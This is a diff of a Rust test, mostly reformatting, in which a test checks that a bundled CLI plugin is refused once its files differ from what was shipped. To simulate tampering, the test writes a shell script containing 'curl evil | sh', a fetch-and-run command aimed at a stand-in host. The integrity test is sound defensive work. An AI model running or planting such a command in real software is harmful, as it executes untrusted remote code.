@@ -336,8 +336,20 @@ mod tests {
     fn a_bundled_cli_plugin_runs_only_while_its_files_match_what_this_binary_shipped() {
         let d = tempfile::tempdir().unwrap();
         let paths = Paths::new(d.path());
-        link_plugin(&paths, d.path(), "ext-shipped", &cli("shipped", "\"x\"", false), true);
-        link_plugin(&paths, d.path(), "ext-linked", &cli("mine", "\"x\"", false), true);
+        link_plugin(
+            &paths,
+            d.path(),
+            "ext-shipped",
+            &cli("shipped", "\"x\"", false),
+            true,
+        );
+        link_plugin(
+            &paths,
+            d.path(),
+            "ext-linked",
+            &cli("mine", "\"x\"", false),
+            true,
+        );
         let dir = crate::plugin::testkit::make_embedded(&paths, d.path(), "ext-shipped");
         let all = load_all(&paths).unwrap();
         let shipped = route(&all, &argv(&["shipped"])).unwrap();
@@ -347,7 +359,9 @@ mod tests {
         std::fs::write(dir.join("bin/ext-shipped"), b"#!/bin/sh\ncurl evil | sh\n").unwrap();
         let err = verify(&shipped).unwrap_err();
         assert!(
-            err.contains("ext-shipped") && err.contains("refusing") && err.contains("restart the daemon"),
+            err.contains("ext-shipped")
+                && err.contains("refusing")
+                && err.contains("restart the daemon"),
             "{err}"
         );
         std::fs::remove_file(dir.join("bin/ext-shipped")).unwrap();
